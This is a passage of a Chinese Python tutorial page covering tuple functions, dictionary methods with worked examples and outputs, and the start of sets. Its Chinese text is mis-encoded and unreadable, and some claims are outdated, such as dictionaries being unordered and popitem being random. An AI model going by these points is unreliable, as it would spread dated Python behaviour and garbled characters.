</code><br><code>&gt;&gt;&gt; len(tuple1) 3 </code></td></tr><tr><td align="left">2</td><td align="left">max(tuple) è¿”å›å…ƒç»„ä¸­å…ƒç´ æœ€å¤§å€¼ã€‚</td><td align="left"><code>&gt;&gt;&gt; tuple2 = ('5', '4', '8') </code><br><code>&gt;&gt;&gt; max(tuple2) '8'</code></td></tr><tr><td align="left">3</td><td align="left">min(tuple) è¿”å›å…ƒç»„ä¸­å…ƒç´ æœ€å°å€¼ã€‚</td><td align="left"><code>&gt;&gt;&gt; tuple2 = ('5', '4', '8') </code><br><code>&gt;&gt;&gt; min(tuple2) '4' </code></td></tr><tr><td align="left">4</td><td align="left">tuple(iterable) å°†å¯è¿­ä»£ç³»åˆ—è½¬æ¢ä¸ºå…ƒç»„ã€‚</td><td align="left"><code>&gt;&gt;&gt; list1= ['Google', 'Taobao', 'Runoob', 'Baidu'] </code><br><code>&gt;&gt;&gt; tuple1=tuple(list1) </code><br><code>&gt;&gt;&gt; tuple1 ('Google', 'Taobao', 'Runoob', 'Baidu')</code></td></tr></tbody></table><h2 id="å­—å…¸"><a href="#å­—å…¸" class="headerlink" title="å­—å…¸"></a>å­—å…¸</h2><ol><li>å­—å…¸æ˜¯æ— åºçš„ï¼Œä¾é é”®å€¼å¯¹æ¥å­˜å–</li><li>å­—å…¸ç”¨<code>{}</code>æ ‡è¯†ï¼Œ <code>é”®(key) : å€¼(value)</code></li><li><code>key</code>ä¸å¯å˜ï¼Œå¹¶ä¸”æ˜¯å”¯ä¸€çš„</li><li>ä½¿ç”¨<code>{}</code>åˆ›å»ºç©ºå­—å…¸</li><li>é”®å¿…é¡»ä¸å¯å˜ï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ•°å­—ï¼Œå­—ç¬¦ä¸²æˆ–å…ƒç»„å……å½“ï¼Œè€Œç”¨åˆ—è¡¨å°±ä¸è¡Œ</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment"># ç©ºå­—å…¸</span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'test'</span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token comment"># {2: 'test', 'test': 1}</span>dict2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'test'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">'dddd'</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">)</span><span class="token comment"># {'test': 1, 1: 'dddd'}</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡º2,testçš„å€¼</span><span class="token comment"># test 1</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºæ‰€æœ‰é”®å</span><span class="token comment"># dict_keys(['test', 1])</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºæ‰€æœ‰é”®å€¼</span><span class="token comment"># dict_values([1, 'dddd'])</span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'txt'</span>  <span class="token comment"># ä¿®æ”¹é”®å€¼</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token comment"># {2: 'test', 'test': 'txt'}</span><span class="token keyword">del</span> dict2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># åˆ é™¤ä¸€ä¸ªé”®</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">)</span><span class="token comment"># {'test': 1}</span>dict2<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># æ¸…ç©ºå­—å…¸</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">)</span><span class="token comment"># {}</span><span class="token keyword">del</span> dict2  <span class="token comment"># åˆ é™¤å­—å…¸</span>dict2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'var'</span><span class="token punctuation">:</span> <span class="token string">'str'</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'var'</span><span class="token punctuation">:</span> <span class="token string">'var'</span><span class="token punctuation">}</span><span class="token comment"># é‡å¤æ—¶åè€…è¦†ç›–å‰è€…</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">)</span><span class="token comment"># {'1': 2, 'var': 'var', 'test': 'test'}</span><span class="token triple-quoted-string string">'''{2: 'test', 'test': 1}{'test': 1, 1: 'dddd'}test 1dict_keys(['test', 1])dict_values([1, 'dddd']){2: 'test', 'test': 'txt'}{'test': 1}{}{'1': 2, 'var': 'var', 'test': 'test'}'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å‡½æ•°-3"><a href="#å‡½æ•°-3" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h3><table><thead><tr><th align="left">åºå·</th><th align="left">å‡½æ•°åŠæè¿°</th><th align="left">å®ä¾‹</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">len(dict) è®¡ç®—å­—å…¸å…ƒç´ ä¸ªæ•°ï¼Œå³é”®çš„æ€»æ•°ã€‚</td><td align="left"><code>&gt;&gt;&gt; dict = {'Name': 'Runoob', 'Age': 7, 'Class': 'First'} </code><br><code>&gt;&gt;&gt; len(dict) 3</code></td></tr><tr><td align="left">2</td><td align="left">str(dict) è¾“å‡ºå­—å…¸ï¼Œå¯ä»¥æ‰“å°çš„å­—ç¬¦ä¸²è¡¨ç¤ºã€‚</td><td align="left"><code>&gt;&gt;&gt; dict = {'Name': 'Runoob', 'Age': 7, 'Class': 'First'}  </code><br><code>&gt;&gt;&gt; str(dict) </code><br><code>"{'Name': 'Runoob', 'Class': 'First', 'Age': 7}"</code></td></tr><tr><td align="left">3</td><td align="left">type(variable) è¿”å›è¾“å…¥çš„å˜é‡ç±»å‹ï¼Œå¦‚æœå˜é‡æ˜¯å­—å…¸å°±è¿”å›å­—å…¸ç±»å‹ã€‚</td><td align="left"><code>&gt;&gt;&gt; dict = {'Name': 'Runoob', 'Age': 7, 'Class': 'First'}  </code><br><code>&gt;&gt;&gt; type(dict) </code><br><code>&lt;class 'dict'&gt;</code></td></tr></tbody></table><table><thead><tr><th align="left">åºå·</th><th align="left">å‡½æ•°åŠæè¿°</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-clear.html">radiansdict.clear()</a> åˆ é™¤å­—å…¸å†…æ‰€æœ‰å…ƒç´ </td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-copy.html">radiansdict.copy()</a> è¿”å›ä¸€ä¸ªå­—å…¸çš„æµ…å¤åˆ¶</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-fromkeys.html">radiansdict.fromkeys()</a> åˆ›å»ºä¸€ä¸ªæ–°å­—å…¸ï¼Œä»¥åºåˆ—seqä¸­å…ƒç´ åšå­—å…¸çš„é”®ï¼Œvalä¸ºå­—å…¸æ‰€æœ‰é”®å¯¹åº”çš„åˆå§‹å€¼</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-get.html">radiansdict.get(key, default=None)</a> è¿”å›æŒ‡å®šé”®çš„å€¼ï¼Œå¦‚æœé”®ä¸åœ¨å­—å…¸ä¸­è¿”å› default è®¾ç½®çš„é»˜è®¤å€¼</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-in.html">key in dict</a> å¦‚æœé”®åœ¨å­—å…¸dicté‡Œè¿”å›trueï¼Œå¦åˆ™è¿”å›false</td></tr><tr><td align="left">6</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-items.html">radiansdict.items()</a> ä»¥åˆ—è¡¨è¿”å›ä¸€ä¸ªè§†å›¾å¯¹è±¡</td></tr><tr><td align="left">7</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-keys.html">radiansdict.keys()</a> è¿”å›ä¸€ä¸ªè§†å›¾å¯¹è±¡</td></tr><tr><td align="left">8</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-setdefault.html">radiansdict.setdefault(key, default=None)</a> å’Œget()ç±»ä¼¼, ä½†å¦‚æœé”®ä¸å­˜åœ¨äºå­—å…¸ä¸­ï¼Œå°†ä¼šæ·»åŠ é”®å¹¶å°†å€¼è®¾ä¸ºdefault</td></tr><tr><td align="left">9</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-update.html">radiansdict.update(dict2)</a> æŠŠå­—å…¸dict2çš„é”®/å€¼å¯¹æ›´æ–°åˆ°dicté‡Œ</td></tr><tr><td align="left">10</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-values.html">radiansdict.values()</a> è¿”å›ä¸€ä¸ªè§†å›¾å¯¹è±¡</td></tr><tr><td align="left">11</td><td align="left">[pop(key<a href="https://www.runoob.com/python3/python3-att-dictionary-pop.html">,default])</a> åˆ é™¤å­—å…¸ç»™å®šé”® key æ‰€å¯¹åº”çš„å€¼ï¼Œè¿”å›å€¼ä¸ºè¢«åˆ é™¤çš„å€¼ã€‚keyå€¼å¿…é¡»ç»™å‡ºã€‚ å¦åˆ™ï¼Œè¿”å›defaultå€¼ã€‚</td></tr><tr><td align="left">12</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-popitem.html">popitem()</a> éšæœºè¿”å›å¹¶åˆ é™¤å­—å…¸ä¸­çš„æœ€åä¸€å¯¹é”®å’Œå€¼ã€‚</td></tr></tbody></table><h3 id="å‡½æ•°ç¤ºä¾‹-3"><a href="#å‡½æ•°ç¤ºä¾‹-3" class="headerlink" title="å‡½æ•°ç¤ºä¾‹"></a>å‡½æ•°ç¤ºä¾‹</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Name'</span><span class="token punctuation">:</span> <span class="token string">'Zara'</span><span class="token punctuation">,</span> <span class="token string">'Age'</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">}</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"å­—å…¸é•¿åº¦ : %d"</span> <span class="token operator">%</span>  <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># å­—å…¸é•¿åº¦ : 2</span><span class="token builtin">dict</span><span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"å­—å…¸åˆ é™¤åé•¿åº¦ : %d"</span> <span class="token operator">%</span>  <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># å­—å…¸åˆ é™¤åé•¿åº¦ : 0</span>dict1 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Name'</span><span class="token punctuation">:</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Age'</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'Class'</span><span class="token punctuation">:</span> <span class="token string">'First'</span><span class="token punctuation">}</span>dict2 <span class="token operator">=</span> dict1<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"æ–°å¤åˆ¶çš„å­—å…¸ä¸º : "</span><span class="token punctuation">,</span> dict2<span class="token punctuation">)</span><span class="token comment"># æ–°å¤åˆ¶çš„å­—å…¸ä¸º :  {'Name': 'Runoob', 'Age': 7, 'Class': 'First'}</span>seq <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">,</span> <span class="token string">'sex'</span><span class="token punctuation">)</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">.</span>fromkeys<span class="token punctuation">(</span>seq<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"æ–°çš„å­—å…¸ä¸º : %s"</span> <span class="token operator">%</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># æ–°çš„å­—å…¸ä¸º : {'name': None, 'age': None, 'sex': None}</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">.</span>fromkeys<span class="token punctuation">(</span>seq<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"æ–°çš„å­—å…¸ä¸º : %s"</span> <span class="token operator">%</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># æ–°çš„å­—å…¸ä¸º : {'name': 10, 'age': 10, 'sex': 10}</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Name'</span><span class="token punctuation">:</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Age'</span><span class="token punctuation">:</span> <span class="token number">27</span><span class="token punctuation">}</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"Age å€¼ä¸º : %s"</span> <span class="token operator">%</span>  <span class="token builtin">dict</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Age'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Age å€¼ä¸º : 27</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"Sex å€¼ä¸º : %s"</span> <span class="token operator">%</span>  <span class="token builtin">dict</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Sex'</span><span class="token punctuation">,</span> <span class="token string">"NA"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Sex å€¼ä¸º : NA</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Name'</span><span class="token punctuation">:</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Age'</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">}</span><span class="token comment"># æ£€æµ‹é”® Age æ˜¯å¦å­˜åœ¨</span><span class="token keyword">if</span> <span class="token string">'Age'</span> <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"é”® Age å­˜åœ¨"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"é”® Age ä¸å­˜åœ¨"</span><span class="token punctuation">)</span><span class="token comment"># é”® Age å­˜åœ¨</span><span class="token comment"># æ£€æµ‹é”® Sex æ˜¯å¦å­˜åœ¨</span><span class="token keyword">if</span> <span class="token string">'Sex'</span> <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"é”® Sex å­˜åœ¨"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"é”® Sex ä¸å­˜åœ¨"</span><span class="token punctuation">)</span><span class="token comment"># é”® Sex ä¸å­˜åœ¨</span><span class="token comment"># not in</span><span class="token comment"># æ£€æµ‹é”® Age æ˜¯å¦å­˜åœ¨</span><span class="token keyword">if</span> <span class="token string">'Age'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"é”® Age ä¸å­˜åœ¨"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"é”® Age å­˜åœ¨"</span><span class="token punctuation">)</span><span class="token comment"># é”® Age å­˜åœ¨</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Name'</span><span class="token punctuation">:</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Age'</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Value : %s"</span> <span class="token operator">%</span> <span class="token builtin">dict</span><span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Value : dict_items([('Name', 'Runoob'), ('Age', 7)])</span>dishes <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'eggs'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'sausage'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'bacon'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'spam'</span><span class="token punctuation">:</span> <span class="token number">500</span><span class="token punctuation">}</span>keys <span class="token operator">=</span> dishes<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span>values <span class="token operator">=</span> dishes<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># è¿­ä»£</span>n <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> val <span class="token keyword">in</span> values<span class="token punctuation">:</span>    n <span class="token operator">+=</span> val<span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token comment"># 504</span><span class="token comment"># keys å’Œ values ä»¥ç›¸åŒé¡ºåºï¼ˆæ’å…¥é¡ºåºï¼‰è¿›è¡Œè¿­ä»£</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span>keys<span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment"># ä½¿ç”¨ list() è½¬æ¢ä¸ºåˆ—è¡¨</span><span class="token comment"># ['eggs', 'sausage', 'bacon', 'spam']</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span>values<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># [2, 1, 1, 500]</span><span class="token comment"># è§†å›¾å¯¹è±¡æ˜¯åŠ¨æ€çš„ï¼Œå—å­—å…¸å˜åŒ–çš„å½±å“ï¼Œä»¥ä¸‹åˆ é™¤äº†å­—å…¸çš„ keyï¼Œè§†å›¾å¯¹è±¡è½¬ä¸ºåˆ—è¡¨åä¹Ÿè·Ÿç€å˜åŒ–</span><span class="token keyword">del</span> dishes<span class="token punctuation">[</span><span class="token string">'eggs'</span><span class="token punctuation">]</span><span class="token keyword">del</span> dishes<span class="token punctuation">[</span><span class="token string">'sausage'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span>keys<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ['bacon', 'spam']</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Name'</span><span class="token punctuation">:</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Age'</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Age é”®çš„å€¼ä¸º : %s"</span> <span class="token operator">%</span> <span class="token builtin">dict</span><span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token string">'Age'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Age é”®çš„å€¼ä¸º : 7</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Sex é”®çš„å€¼ä¸º : %s"</span> <span class="token operator">%</span> <span class="token builtin">dict</span><span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token string">'Sex'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Sex é”®çš„å€¼ä¸º : None</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"æ–°å­—å…¸ä¸ºï¼š"</span><span class="token punctuation">,</span> <span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token comment"># æ–°å­—å…¸ä¸ºï¼š {'Name': 'Runoob', 'Age': 7, 'Sex': None}</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Name'</span><span class="token punctuation">:</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Age'</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">}</span>dict2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Sex'</span><span class="token punctuation">:</span> <span class="token string">'female'</span><span class="token punctuation">}</span><span class="token builtin">dict</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span>dict2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"æ›´æ–°å­—å…¸ dict : "</span><span class="token punctuation">,</span> <span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token comment"># æ›´æ–°å­—å…¸ dict :  {'Name': 'Runoob', 'Age': 7, 'Sex': 'female'}</span>site<span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'èœé¸Ÿæ•™ç¨‹'</span><span class="token punctuation">,</span> <span class="token string">'alexa'</span><span class="token punctuation">:</span> <span class="token number">10000</span><span class="token punctuation">,</span> <span class="token string">'url'</span><span class="token punctuation">:</span> <span class="token string">'www.runoob.com'</span><span class="token punctuation">}</span>pop_obj<span class="token operator">=</span>site<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>pop_obj<span class="token punctuation">)</span><span class="token comment"># èœé¸Ÿæ•™ç¨‹</span>site<span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'èœé¸Ÿæ•™ç¨‹'</span><span class="token punctuation">,</span> <span class="token string">'alexa'</span><span class="token punctuation">:</span> <span class="token number">10000</span><span class="token punctuation">,</span> <span class="token string">'url'</span><span class="token punctuation">:</span> <span class="token string">'www.runoob.com'</span><span class="token punctuation">}</span>pop_obj<span class="token operator">=</span>site<span class="token punctuation">.</span>popitem<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>pop_obj<span class="token punctuation">)</span><span class="token comment"># ('url', 'www.runoob.com')</span><span class="token keyword">print</span><span class="token punctuation">(</span>site<span class="token punctuation">)</span><span class="token comment"># {'name': 'èœé¸Ÿæ•™ç¨‹', 'alexa': 10000}</span><span class="token triple-quoted-string string">'''å­—å…¸é•¿åº¦ : 2å­—å…¸åˆ é™¤åé•¿åº¦ : 0æ–°å¤åˆ¶çš„å­—å…¸ä¸º :  {'Name': 'Runoob', 'Age': 7, 'Class': 'First'}æ–°çš„å­—å…¸ä¸º : {'name': None, 'age': None, 'sex': None}æ–°çš„å­—å…¸ä¸º : {'name': 10, 'age': 10, 'sex': 10}Age å€¼ä¸º : 27Sex å€¼ä¸º : NAé”® Age å­˜åœ¨é”® Sex ä¸å­˜åœ¨é”® Age å­˜åœ¨Value : dict_items([('Name', 'Runoob'), ('Age', 7)])504['eggs', 'sausage', 'bacon', 'spam'][2, 1, 1, 500]['bacon', 'spam']Age é”®çš„å€¼ä¸º : 7Sex é”®çš„å€¼ä¸º : Noneæ–°å­—å…¸ä¸ºï¼š {'Name': 'Runoob', 'Age': 7, 'Sex': None}æ›´æ–°å­—å…¸ dict :  {'Name': 'Runoob', 'Age': 7, 'Sex': 'female'}èœé¸Ÿæ•™ç¨‹('url', 'www.runoob.com'){'name': 'èœé¸Ÿæ•™ç¨‹', 'alexa': 10000}'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é›†åˆ"><a href="#é›†åˆ" class="headerlink" title="é›†åˆ"></a>é›†åˆ</h2><p>åˆ›å»ºæ ¼å¼</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">parame <span class="token operator">=</span> <span class="token punctuation">{</span>value1<span class="token punctuation">,</span> value2<span class="token punctuation">,</span> â€¦â€¦<span class="token punctuation">}</span><span class="token keyword">or</span><span class="token builtin">set</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># åˆ›å»ºä¸€ä¸ªç©ºé›†åˆ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">sites <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'123'</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>sites<span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºé›†åˆï¼Œé‡å¤çš„å…ƒç´ è¢«è‡ªåŠ¨å»æ‰</span><span class="token comment"># {1, '123', 'test'}</span><span class="token comment"># æˆå‘˜æµ‹è¯•</span><span class="token keyword">if</span> <span class="token string">'test'</span> <span class="token keyword">in</span> sites<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test åœ¨é›†åˆä¸­'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test ä¸åœ¨é›†åˆä¸­'</span><span class="token punctuation">)</span><span class="token comment"># setå¯ä»¥è¿›è¡Œé›†åˆè¿ç®—</span>a <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'abracadabra'</span><span class="token punctuation">)</span>b <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'alacazam'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">-</span> b<span class="token punctuation">)</span>  <span class="token comment"># a å’Œ b çš„å·®é›†</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">|</span> b<span class="token punctuation">)</span>  <span class="token comment"># a å’Œ b çš„å¹¶é›†</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">&amp;</span> b<span class="token punctuation">)</span>  <span class="token comment"># a å’Œ b çš„äº¤é›†</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">^</span> b<span class="token punctuation">)</span>  <span class="token comment"># a å’Œ b 